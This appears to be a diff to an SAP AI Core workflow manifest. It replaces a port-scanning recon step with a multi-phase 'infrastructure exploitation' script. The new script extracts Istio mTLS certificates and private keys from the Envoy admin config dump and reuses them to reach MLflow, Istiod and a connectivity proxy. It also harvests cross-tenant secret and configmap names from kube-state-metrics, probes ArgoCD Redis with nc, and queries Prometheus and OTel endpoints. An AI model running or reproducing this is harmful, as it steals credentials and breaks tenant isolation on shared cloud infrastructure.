@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "28.0.0"
+    ai.sap.com/version: "29.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,58 +24,207 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V28 TILLER FOCUSED CHECK ==="
+        echo "=== V29 INFRASTRUCTURE EXPLOITATION ==="
         echo "=== $(date -u) ==="
 
-        # Get known service IPs from Envoy first
-        echo "=== ENVOY CLUSTERS WITH PORTS ==="
-        curl -s http://localhost:15000/clusters 2>&1 | grep -E "44134|tiller|helm" | head -20
-        echo "---"
+        # -------------------------------------------------------
+        # PHASE 1: Extract mTLS identity from Envoy config_dump
+        # -------------------------------------------------------
+        echo "=== PHASE1: mTLS CERT EXTRACTION ==="
+        curl -s http://localhost:15000/config_dump > /tmp/envoy_config.json 2>&1
+        echo "[*] Config dump size: $(wc -c < /tmp/envoy_config.json) bytes"
 
-        # Get ALL cluster IPs from Envoy for cross-reference
-        echo "=== ALL ENVOY CLUSTER IPs ==="
-        curl -s http://localhost:15000/clusters 2>&1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+' | sort -u | head -50
-        echo "---"
+        # Extract TLS certificates (they're in dynamic_active_secrets)
+        python3 << 'PYEOF'
+        import json, base64, os
 
-        # DNS lookup for tiller
-        echo "=== DNS LOOKUPS ==="
-        for name in tiller tiller-deploy helm; do
-          for ns in kube-system default istio-system; do
-            result=$(nslookup ${name}.${ns}.svc.cluster.local 2>&1 | grep -A1 "Name:" | tail -1)
-            if [ -n "$result" ] && ! echo "$result" | grep -q "NXDOMAIN"; then
-              echo "[+] ${name}.${ns}: $result"
-            fi
-          done
-        done
-        echo "---"
+        with open('/tmp/envoy_config.json') as f:
+            config = json.load(f)
 
-        # Targeted nmap - just the service subnet, port 44134 only, aggressive timing
-        echo "=== NMAP 100.104.0.0/24 port 44134 ==="
-        nmap -Pn -sS -p44134 --open -T5 --max-retries 1 --host-timeout 2s 100.104.0.0/24 2>&1 | grep -E "open|Nmap scan report"
-        echo "=== NMAP 100.104.1.0/24 port 44134 ==="
-        nmap -Pn -sS -p44134 --open -T5 --max-retries 1 --host-timeout 2s 100.104.1.0/24 2>&1 | grep -E "open|Nmap scan report"
+        # Find secrets in the config dump
+        for cfg in config.get('configs', []):
+            if cfg.get('@type', '').endswith('SecretsConfigDump'):
+                for secret in cfg.get('dynamic_active_secrets', []):
+                    name = secret.get('name', 'unknown')
+                    tls = secret.get('secret', {}).get('tls_certificate', {})
+                    if tls:
+                        # Extract certificate chain
+                        cert_chain = tls.get('certificate_chain', {}).get('inline_bytes', '')
+                        private_key = tls.get('private_key', {}).get('inline_bytes', '')
+                        if cert_chain:
+                            cert_pem = base64.b64decode(cert_chain).decode('utf-8', errors='replace')
+                            with open(f'/tmp/istio-cert-{name}.pem', 'w') as cf:
+                                cf.write(cert_pem)
+                            print(f'[+] CERT extracted: {name} ({len(cert_pem)} bytes)')
+                            # Show cert subject/issuer
+                            os.system(f'openssl x509 -in /tmp/istio-cert-{name}.pem -noout -subject -issuer 2>/dev/null')
+                        if private_key:
+                            key_pem = base64.b64decode(private_key).decode('utf-8', errors='replace')
+                            with open(f'/tmp/istio-key-{name}.pem', 'w') as kf:
+                                kf.write(key_pem)
+                            print(f'[+] KEY extracted: {name} ({len(key_pem)} bytes)')
 
-        # Also try the pod subnet where it might have moved
-        echo "=== NMAP pod subnets 44134 ==="
-        for sub in 100.64.38 100.64.42 100.64.49 100.64.52 100.64.54 100.64.58 100.64.59 100.64.63 100.64.68 100.64.79; do
-          result=$(nmap -Pn -sS -p44134 --open -T5 --max-retries 1 --host-timeout 1s ${sub}.0/24 2>&1 | grep "open")
-          if [ -n "$result" ]; then
-            echo "[+] FOUND on ${sub}.0/24: $result"
+                    # Also check for trust bundles (CA certs)
+                    validation = secret.get('secret', {}).get('validation_context', {})
+                    trusted = validation.get('trusted_ca', {}).get('inline_bytes', '')
+                    if trusted:
+                        ca_pem = base64.b64decode(trusted).decode('utf-8', errors='replace')
+                        with open(f'/tmp/istio-ca-{name}.pem', 'w') as caf:
+                            caf.write(ca_pem)
+                        print(f'[+] CA extracted: {name} ({len(ca_pem)} bytes)')
+
+        print('[*] Cert extraction complete')
+        PYEOF
+
+        # Show what we got
+        echo "[*] Extracted cert files:"
+        ls -la /tmp/istio-*.pem 2>/dev/null
+
+        # -------------------------------------------------------
+        # PHASE 2: Use mTLS certs to access services
+        # -------------------------------------------------------
+        echo "=== PHASE2: mTLS AUTHENTICATED ACCESS ==="
+
+        CERT=$(ls /tmp/istio-cert-*.pem 2>/dev/null | head -1)
+        KEY=$(ls /tmp/istio-key-*.pem 2>/dev/null | head -1)
+        CA=$(ls /tmp/istio-ca-*.pem 2>/dev/null | head -1)
+
+        if [ -n "$CERT" ] && [ -n "$KEY" ]; then
+          echo "[+] Using certs for mTLS connections"
+
+          # Try MLflow with mTLS
+          echo "[*] MLflow tracking with mTLS:"
+          curl -s --cert "$CERT" --key "$KEY" --cacert "$CA" \
+            "https://ml-tracking-service.ml-tracking.svc.cluster.local:443/api/2.0/mlflow/experiments/list" 2>&1 | head -c 1000
+          echo ""
+
+          # Try Istiod with mTLS
+          echo "[*] Istiod debug with mTLS:"
+          curl -s --cert "$CERT" --key "$KEY" --cacert "$CA" \
+            "https://istiod.istio-system.svc.cluster.local:15014/debug/endpointz" 2>&1 | head -c 2000
+          echo ""
+
+          # Try connectivity proxy
+          echo "[*] Connectivity proxy with mTLS:"
+          curl -s --cert "$CERT" --key "$KEY" --cacert "$CA" \
+            "https://tunnel-0.connectivity-proxy.svc.cluster.local:443/" 2>&1 | head -c 500
+          echo ""
+        else
+          echo "[-] No certs extracted, trying plaintext"
+
+          # Plaintext fallback for Istiod
+          echo "[*] Istiod debug endpoints (plaintext):"
+          ISTIOD=$(curl -s http://localhost:15000/clusters 2>&1 | grep "istiod" | grep -oE '100\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
+          echo "[*] Istiod IP: $ISTIOD"
+          if [ -n "$ISTIOD" ]; then
+            for ep in "/debug/endpointz" "/debug/configz" "/debug/authorizationz" "/debug/registryz" "/debug/syncz"; do
+              echo "--- ${ep} ---"
+              curl -s --connect-timeout 3 "http://${ISTIOD}:15014${ep}" 2>&1 | head -c 1000
+              echo ""
+            done
+            # Also try 8080 (Istiod monitoring)
+            echo "--- :8080/debug/endpointz ---"
+            curl -s --connect-timeout 3 "http://${ISTIOD}:8080/debug/endpointz" 2>&1 | head -c 1000
+            echo ""
           fi
-        done
-        echo "---"
+        fi
 
-        # Direct TCP check on the IPs from previous recon8 (if we had specific ones)
-        echo "=== DIRECT TCP PROBES 44134 ==="
-        for ip in 100.104.0.1 100.104.0.10 100.104.0.53 100.104.0.100 100.104.0.150 100.104.0.200 100.104.1.1 100.104.1.10 100.104.1.100; do
-          nc -z -w1 $ip 44134 2>/dev/null && echo "[+] $ip:44134 OPEN" || true
-        done
+        # -------------------------------------------------------
+        # PHASE 3: KSM deep dump - secrets, configmaps, services
+        # -------------------------------------------------------
+        echo "=== PHASE3: KSM DEEP DUMP ==="
+        KSM_HOST="ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080"
 
-        # Also check 27017 (MongoDB) and 15014 (Istiod) while we're here
-        echo "=== BONUS: MongoDB 27017 check ==="
-        nmap -Pn -sS -p27017 --open -T5 --max-retries 1 --host-timeout 2s 100.104.0.0/24 2>&1 | grep -E "open|Nmap scan report"
-        echo "=== BONUS: Istiod 15014 direct ==="
-        curl -s --connect-timeout 2 "http://100.64.79.247:15014/debug/registryz" 2>&1 | head -c 500
+        # Get ALL available metric families
+        echo "[*] All metric families:"
+        curl -s "http://${KSM_HOST}/metrics" 2>&1 | grep "^# HELP" | head -40
         echo ""
 
-        echo "=== V28 DONE ==="
+        # Secret names across all namespaces
+        echo "[*] kube_secret_info (cross-tenant secrets):"
+        curl -s "http://${KSM_HOST}/metrics" 2>&1 | grep "kube_secret_info" | head -30
+        echo ""
+
+        # ConfigMap names
+        echo "[*] kube_configmap_info (cross-tenant configmaps):"
+        curl -s "http://${KSM_HOST}/metrics" 2>&1 | grep "kube_configmap_info" | head -30
+        echo ""
+
+        # Service info
+        echo "[*] kube_service_info (cross-tenant services):"
+        curl -s "http://${KSM_HOST}/metrics" 2>&1 | grep "kube_service_info" | head -30
+        echo ""
+
+        # Service account info
+        echo "[*] kube_serviceaccount_info:"
+        curl -s "http://${KSM_HOST}/metrics" 2>&1 | grep "kube_serviceaccount_info" | head -20
+        echo ""
+
+        # Try the other KSM endpoints (from recon7: 3 endpoints)
+        for ksm in \
+          "ksm-kube-state-metrics.opentelemetry.svc.cluster.local:8080" \
+          "ksm-resources-kube-state-metrics.opentelemetry.svc.cluster.local:8080" \
+          "ksm-cronjobs-kube-state-metrics.opentelemetry.svc.cluster.local:8080"; do
+          echo "[*] Trying ${ksm}:"
+          METRICS=$(curl -s --connect-timeout 3 "http://${ksm}/metrics" 2>&1)
+          echo "  Size: $(echo "$METRICS" | wc -c) bytes"
+          echo "  Families: $(echo "$METRICS" | grep '^# HELP' | wc -l)"
+          # Look for secrets/configmaps specifically
+          echo "$METRICS" | grep -E "kube_secret|kube_configmap|kube_service_info|kube_serviceaccount" | head -10
+          echo ""
+        done
+
+        # -------------------------------------------------------
+        # PHASE 4: ArgoCD Redis probe
+        # -------------------------------------------------------
+        echo "=== PHASE4: ARGOCD REDIS ==="
+        # From KSM v27: argocd-redis-ha-server-0 at 100.64.4.136
+        # But pod IP may have changed. Get fresh from KSM
+        REDIS_IP=$(curl -s "http://${KSM_HOST}/metrics" 2>&1 | grep "argocd-redis" | grep -oE 'pod_ip="[^"]*"' | head -1 | cut -d'"' -f2)
+        echo "[*] ArgoCD Redis pod IP: ${REDIS_IP}"
+
+        if [ -n "$REDIS_IP" ]; then
+          # Try Redis default port 6379
+          echo "[*] Probing ${REDIS_IP}:6379"
+          echo "PING" | nc -w3 ${REDIS_IP} 6379 2>&1
+          echo "INFO" | nc -w3 ${REDIS_IP} 6379 2>&1 | head -30
+          # Also try 26379 (Sentinel)
+          echo "[*] Probing ${REDIS_IP}:26379 (Sentinel)"
+          echo "PING" | nc -w3 ${REDIS_IP} 26379 2>&1
+        fi
+
+        # Also try DNS
+        echo "[*] ArgoCD Redis DNS:"
+        nslookup argocd-redis-ha.argocd-tenants.svc.cluster.local 2>&1 | tail -5
+        nslookup argocd-redis-ha-announce-0.argocd-tenants.svc.cluster.local 2>&1 | tail -5
+
+        # -------------------------------------------------------
+        # PHASE 5: Prometheus query
+        # -------------------------------------------------------
+        echo "=== PHASE5: PROMETHEUS ==="
+        PROM_IP=$(curl -s http://localhost:15000/clusters 2>&1 | grep "prometheus" | grep -oE '100\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
+        echo "[*] Prometheus IP: ${PROM_IP}"
+        if [ -n "$PROM_IP" ]; then
+          echo "[*] Prometheus targets:"
+          curl -s --connect-timeout 3 "http://${PROM_IP}:9090/api/v1/targets" 2>&1 | head -c 2000
+          echo ""
+          echo "[*] Prometheus label values for namespace:"
+          curl -s --connect-timeout 3 "http://${PROM_IP}:9090/api/v1/label/namespace/values" 2>&1 | head -c 1000
+          echo ""
+        fi
+
+        # -------------------------------------------------------
+        # PHASE 6: OTel collector data
+        # -------------------------------------------------------
+        echo "=== PHASE6: OTEL COLLECTORS ==="
+        # Check what's exposed on the OTel endpoints from v28
+        for ip in 100.64.139.10 100.64.139.7 100.64.140.9; do
+          echo "[*] OTel ${ip}:8888 (metrics):"
+          curl -s --connect-timeout 2 "http://${ip}:8888/metrics" 2>&1 | head -c 500
+          echo ""
+          echo "[*] OTel ${ip}:13133 (health):"
+          curl -s --connect-timeout 2 "http://${ip}:13133/" 2>&1 | head -c 200
+          echo ""
+        done
+
+        echo "=== V29 DONE $(date -u) ==="
